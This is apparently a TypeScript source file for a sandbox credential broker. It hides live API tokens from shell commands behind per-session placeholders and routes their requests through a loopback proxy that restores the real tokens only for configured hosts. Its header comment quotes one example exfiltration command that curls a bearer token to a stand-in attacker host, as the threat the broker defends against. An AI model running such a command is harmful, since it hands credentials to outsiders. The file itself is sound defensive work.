/**
 * SHELL_CREDENTIAL_BROKER_V1 (harness to nine, S1): the credential broker for commands.
 *
 * The runner holds ONE live 24h sandbox bearer under seven names (VESTRA_API_TOKEN and the six
 * model-proxy tokens; apps/sandbox runner-token.ts LOCKSTEP_TOKEN_ENV_VARS). Without the broker
 * every shell child inherits it, so `env` or an injected `curl evil.example -d "$VESTRA_API_TOKEN"`
 * hands it out. With the broker a command's children see instead:
 *   - every live token value replaced by this session's placeholder `vbrk_<32 hex>`;
 *   - no other runner secret at all (WITHHELD_RUNNER_SECRETS, e.g. CF_TURN_API_TOKEN);
 *   - each lane's base URL (VESTRA_SERVER_URL, OPENAI_BASE_URL, ...) replaced by a route on this
 *     session's loopback reverse proxy, e.g. `http://127.0.0.1:41234/api`.
 * The proxy forwards only to the runner's OWN configured base URLs (the route table is the runner
 * env, never the request) and swaps the placeholder for the live token in request headers on the
 * way out. Sent anywhere else, the placeholder is just a string.
 *
 * One broker per TerminalSession (so per task): its own placeholder and its own listener, closed
 * with the session. No module-level state. Tokens and base URLs are read live on every request, so
 * a TOKEN_REFRESH swap applies at once.
 *
 * Not a boundary on its own: a same-uid child can still read /proc/<runner>/environ or the
 * persisted token file. S2 (commands as their own user) closes that.
 *
 * WebSocket upgrades are not brokered (no in-box consumer today): an Upgrade request is dropped.
 */
import { createServer, request as httpRequest, type IncomingMessage, type OutgoingHttpHeaders, type Server, type ServerResponse } from 'node:http';
import { request as httpsRequest } from 'node:https';
import type { AddressInfo } from 'node:net';
import { pipeline } from 'node:stream';
import { randomBytes } from 'node:crypto';
import { credentialBrokerEnabled } from '../policy/feature-flags.js';
import { egressEnforced } from './egress-proxy-env.js';

type Env = Record<string, string | undefined>;

/** Each brokered lane: its loopback route, the base-URL var a child reads, the token var that authenticates it. */
export const BROKER_LANES = [
  { route: 'api', baseVar: 'VESTRA_SERVER_URL', tokenVar: 'VESTRA_API_TOKEN' },
  { route: 'anthropic', baseVar: 'ANTHROPIC_BASE_URL', tokenVar: 'ANTHROPIC_AUTH_TOKEN' },
  { route: 'openai', baseVar: 'OPENAI_BASE_URL', tokenVar: 'OPENAI_API_KEY' },
  { route: 'fireworks', baseVar: 'FIREWORKS_BASE_URL', tokenVar: 'FIREWORKS_API_KEY' },
  { route: 'meta', baseVar: 'META_BASE_URL', tokenVar: 'META_API_KEY' },
  { route: 'xai', baseVar: 'XAI_BASE_URL', tokenVar: 'XAI_API_KEY' },
  { route: 'gemini', baseVar: 'GEMINI_BASE_URL', tokenVar: 'GEMINI_AUTH_TOKEN' },
] as const;

/**
 * Every OTHER secret the runner env carries, by exact name, and why no command needs it. With the
 * flag on each is withheld from every child (and its value scrubbed wherever it appears). This is
 * the catalog: apps/server sandbox-envs.test.ts fails when the runner env gains a secret that is
 * neither here, a brokered lane token, nor in PASSED_RUNNER_KEYS. Exact membership, never a pattern.
 */
export const WITHHELD_RUNNER_SECRETS: Readonly<Record<string, string>> = {
  CF_TURN_API_TOKEN: 'Cloudflare TURN API token: only the box entrypoint reads it, at boot, to mint the browser stream ICE servers',
  CF_TURN_KEY_ID: 'the TURN key id that pairs with CF_TURN_API_TOKEN; same single boot-time reader',
  MCP_SERVER_CONFIG: 'the Composio tool-router capability URL and headers: only the runner\'s in-process MCP client reads it; commands reach connected apps through tools',
  NEKO_WEBRTC_ICESERVERS_FRONTEND: 'the minted 24h TURN relay credentials the entrypoint exports for Neko; no command reads them',
  NEKO_WEBRTC_ICESERVERS_BACKEND: 'the same minted TURN relay credentials, Neko\'s server side',
};

/** Runner env keys whose NAMES look like secrets but whose values are not; children keep them. */
export const PASSED_RUNNER_KEYS: Readonly<Record<string, string>> = {
  VESTRA_CREDENTIALS_EPOCH: 'a timestamp saying which credential mint the runner converged on, not a credential',
  SHELL_CREDENTIAL_BROKER_V1: 'this feature flag, a boolean',
  TOOL_OUTPUT_TOKEN_BUDGET_V1: 'a feature flag (tool output budgets counted in model tokens), a boolean',
};

/** A token shorter than this is a dev stub, not a bearer; substituting it would mangle ordinary values. */
const MIN_TOKEN_LENGTH = 16;
/** The only request headers a placeholder is swapped in: where our lanes read a bearer. Exact membership, never a scan. */
const CREDENTIAL_HEADERS: ReadonlySet<string> = new Set(['authorization', 'x-api-key', 'x-goog-api-key']);
/** Headers that describe one hop, never forwarded. */
const HOP_HEADERS = new Set(['host', 'connection', 'keep-alive', 'proxy-connection', 'proxy-authorization', 'te', 'trailer', 'transfer-encoding', 'upgrade']);
/** `/<route>` then nothing, a path or a query: never `@`, `:` or anything else that could move the host. */
const ROUTE_PATH = /^\/([a-z]+)((?:[/?].*)?)$/;

export const mintPlaceholder = (): string => `vbrk_${randomBytes(16).toString('hex')}`;

/**
 * A copy of `env` with no runner secret in it: every WITHHELD_RUNNER_SECRETS name removed where it
 * still holds the runner's own value, and every occurrence of a live secret value (a lane token or
 * a withheld secret, read from `runnerEnv`) replaced by `placeholder`. So a company's own
 * OPENAI_API_KEY or CF_TURN_API_TOKEN (Platform L17 variables, or a session's own `export`)
 * passes untouched, while a copy of the runner's value under any name is still scrubbed.
 * Stateless; hooks use it directly.
 */
export function withoutRunnerSecrets<T extends Env>(env: T, placeholder: string = mintPlaceholder(), runnerEnv: Env = process.env): T {
  const names = [...BROKER_LANES.map((l) => l.tokenVar), ...Object.keys(WITHHELD_RUNNER_SECRETS)];
  const secrets = [...new Set(names.map((n) => runnerEnv[n] ?? ''))].filter((t) => t.length >= MIN_TOKEN_LENGTH);
  const out: Env = { ...env };
  for (const name of Object.keys(WITHHELD_RUNNER_SECRETS)) if (out[name] === runnerEnv[name]) delete out[name];
  for (const [k, v] of Object.entries(out)) {
    if (v !== undefined && secrets.some((t) => v.includes(t))) out[k] = secrets.reduce((s, t) => s.split(t).join(placeholder), v);
  }
  return out as T;
}

/**
 * For a spawn that never needs our API (ability hooks, a company's setup script and clone):
 * flag on, `withoutRunnerSecrets(env)`, a placeholder that works nowhere; flag off, `env` itself.
 */
export function brokeredSpawnEnv<T extends Env>(env: T): T {
  return credentialBrokerEnabled() ? withoutRunnerSecrets(env) : env;
}

export class CredentialBroker {
  readonly placeholder = mintPlaceholder();
  private server: Server | undefined;
  private port: number | undefined;
  private starting: Promise<void> | undefined;

  constructor(private readonly runnerEnv: () => Env = () => process.env) {}

  /**
   * Start the loopback listener (once). Never rejects: if the listen fails, children still get
   * placeholders but no routes, so their calls to our API fail loudly and the token never leaks.
   */
  start(): Promise<void> {
    this.starting ??= new Promise<void>((resolve) => {
      const server = createServer((req, res) => this.forward(req, res));
      this.server = server;
      server.on('error', (err) => {
        console.warn(`[credential-broker] loopback listener error (children keep placeholders; a lane without a route fails): ${err.message}`);
        resolve();
      });
      server.listen(0, '127.0.0.1', () => {
        if (this.server === server) this.port = (server.address() as AddressInfo).port;
        server.unref();
        resolve();
      });
    });
    return this.starting;
  }

  /** The env a child of this session gets: tokens become the placeholder, inherited lane URLs become loopback routes. */
  childEnv<T extends Env>(env: T): T {
    const live = this.runnerEnv();
    const out: Env = withoutRunnerSecrets(env, this.placeholder, live);
    if (this.port === undefined) return out as T;
    for (const { route, baseVar } of BROKER_LANES) {
      // Only the inherited value moves: a URL the person or their company set on purpose stays theirs.
      if (live[baseVar] && out[baseVar] === live[baseVar]) out[baseVar] = `http://127.0.0.1:${this.port}/${route}`;
    }
    // A shadow egress proxy (SHELL_EGRESS_V1) must not intercept the hop to our own loopback.
    // Under enforce it must: the proxy admits this broker (not a runner listener) and refuses
    // the runner's own listeners, which a blanket 127.0.0.1 exemption would hand straight back.
    if (egressEnforced(live)) return out as T;
    for (const k of ['NO_PROXY', 'no_proxy']) {
      const v = out[k];
      out[k] = !v ? '127.0.0.1,localhost' : v.split(',').includes('127.0.0.1') ? v : `${v},127.0.0.1,localhost`;
    }
    return out as T;
  }

  close(): void {
    const server = this.server;
    this.server = undefined;
    this.port = undefined;
    if (!server) return;
    server.closeAllConnections();
    server.close();
  }

  private forward(req: IncomingMessage, res: ServerResponse): void {
    const refuse = (status: number, why: string) => {
      res.writeHead(status, { 'content-type': 'text/plain' }).end(`credential broker: ${why}\n`);
    };
    const m = ROUTE_PATH.exec(req.url ?? '');
    if (!m) return refuse(403, 'forwards only to Vestra hosts');
    const lane = BROKER_LANES.find((l) => l.route === m[1]);
    const live = this.runnerEnv();
    const base = lane && live[lane.baseVar];
    if (!lane || !base) return refuse(404, 'no such lane');
    let target: URL;
    try {
      target = new URL(base.replace(/\/+$/, '') + m[2]);
      if (target.origin !== new URL(base).origin || !['http:', 'https:'].includes(target.protocol)) throw new Error('origin moved');
    } catch {
      return refuse(404, 'no such lane');
    }
    const token = live[lane.tokenVar] ?? '';
    const swap = (v: string) => (token ? v.split(this.placeholder).join(token) : v);
    const headers: OutgoingHttpHeaders = {};
    for (const [k, v] of Object.entries(req.headers)) {
      if (v === undefined || HOP_HEADERS.has(k)) continue;
      headers[k] = !CREDENTIAL_HEADERS.has(k) ? v : Array.isArray(v) ? v.map(swap) : swap(v);
    }
    const send = target.protocol === 'https:' ? httpsRequest : httpRequest;
    const upstream = send(target, { method: req.method, headers }, (up) => {
      const back: OutgoingHttpHeaders = {};
      for (const [k, v] of Object.entries(up.headers)) if (v !== undefined && !HOP_HEADERS.has(k)) back[k] = v;
      res.writeHead(up.statusCode ?? 502, back);
      pipeline(up, res, () => {}); // an upstream that dies mid-body tears the child's response down
    });
    upstream.on('error', () => (res.headersSent ? res.destroy() : refuse(502, 'upstream unreachable')));
    res.on('close', () => { if (!res.writableFinished) upstream.destroy(); }); // the child hung up, before or mid-stream
    pipeline(req, upstream, () => {});
  }
}
